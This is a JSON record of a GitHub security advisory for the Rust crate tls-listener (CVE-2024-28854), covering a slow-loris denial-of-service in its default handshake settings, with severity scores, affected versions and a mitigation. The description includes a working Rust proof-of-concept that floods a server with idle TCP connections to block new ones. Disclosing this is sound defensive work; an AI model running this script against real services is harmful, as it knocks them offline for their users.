{
	"id": "GHSA-2qph-qpvm-2qf7",
	"advisories": [
		{
			"id": "GHSA-2qph-qpvm-2qf7",
			"title": "tls-listener affected by the slow loris vulnerability with default configuration",
			"description": "### Summary\nWith the default configuration of tls-listener, a malicious user can open 6.4 `TcpStream`s a second, sending 0 bytes, and can trigger a DoS.\n\n### Details\nThe default configuration options make any public service using `TlsListener::new()` vulnerable to a slow-loris DoS attack.\n\n```rust\n/// Default number of concurrent handshakes\npub const DEFAULT_MAX_HANDSHAKES: usize = 64;\n/// Default timeout for the TLS handshake.\npub const DEFAULT_HANDSHAKE_TIMEOUT: Duration = Duration::from_secs(10);\n```\n\n### PoC\n\nRunning the HTTP TLS server example: https://github.com/tmccombs/tls-listener/blob/6c57dea2d9beb1577ae4d80f6eaf03aad4ef3857/examples/http.rs, then running the following script will prevent new connections to the server.\n\n```rust\nuse std::{net::ToSocketAddrs, time::Duration};\nuse tokio::{io::AsyncReadExt, net::TcpStream, task::JoinSet};\n\n#[tokio::main]\nasync fn main() {\n    const N: usize = 1024;\n    const T: Duration = Duration::from_secs(10);\n\n    let url = \"127.0.0.1:3000\";\n    let sockets: Vec<_> = url\n        .to_socket_addrs()\n        .unwrap()\n        .inspect(|s| println!(\"{s:?}\"))\n        .collect();\n\n    let mut js = JoinSet::new();\n\n    let mut int = tokio::time::interval(T / (N as u32) / (sockets.len() as u32));\n    int.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Burst);\n    for _ in 0..10000 {\n        for &socket in &sockets {\n            int.tick().await;\n            js.spawn(async move {\n                let mut stream = TcpStream::connect(socket).await.unwrap();\n                let _ = tokio::time::timeout(T, stream.read_to_end(&mut Vec::new())).await;\n            });\n        }\n    }\n\n    while js.join_next().await.is_some() {}\n}\n\n```\n\n### Impact\n\nThis is an instance of a [slow-loris attack](https://en.wikipedia.org/wiki/Slowloris_(computer_security)). This impacts any publically accessible service using the default configuration of `tls-listener`\n\n\n### Mitigation\n\nPrevious versions can mitigate this by passing a large value, such as `usize::MAX` as the parameter to `Builder::max_handshakes`.",
			"severity": [
				{
					"type": "cvss_v31",
					"source": "github.com/advisories",
					"cvss_v31": {
						"vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
						"base_score": 7.5,
						"base_severity": "HIGH",
						"temporal_score": 7.5,
						"temporal_severity": "HIGH",
						"environmental_score": 7.5,
						"environmental_severity": "HIGH"
					}
				},
				{
					"type": "vendor",
					"source": "github.com/advisories",
					"vendor": "HIGH"
				}
			],
			"references": [
				{
					"source": "github.com/advisories",
					"url": "https://github.com/tmccombs/tls-listener/security/advisories/GHSA-2qph-qpvm-2qf7"
				},
				{
					"source": "github.com/advisories",
					"url": "https://nvd.nist.gov/vuln/detail/CVE-2024-28854"
				},
				{
					"source": "github.com/advisories",
					"url": "https://github.com/tmccombs/tls-listener/commit/d5a7655d6ea9e53ab57c3013092c5576da964bc4"
				},
				{
					"source": "github.com/advisories",
					"url": "https://en.wikipedia.org/wiki/Slowloris_(computer_security)"
				},
				{
					"source": "github.com/advisories",
					"url": "https://github.com/tmccombs/tls-listener"
				},
				{
					"source": "github.com/advisories",
					"url": "https://github.com/tmccombs/tls-listener/releases/tag/v0.10.0"
				}
			],
			"published": "2024-03-15T19:57:22Z",
			"modified": "2024-03-18T18:33:18Z",
			"optional": {
				"github_reviewed": true
			}
		}
	],
	"vulnerabilities": [
		{
			"id": "CVE-2024-28854"
		}
	],
	"detection": [
		{
			"ecosystem": "cargo",
			"vulnerable": true,
			"package": {
				"name": "tls-listener"
			},
			"affected": {
				"type": "semver",
				"range": [
					{
						"lt": "0.10.0"
					}
				],
				"fixed": [
					"0.10.0"
				]
			}
		}
	],
	"data_source": "cargo-ghsa"
}
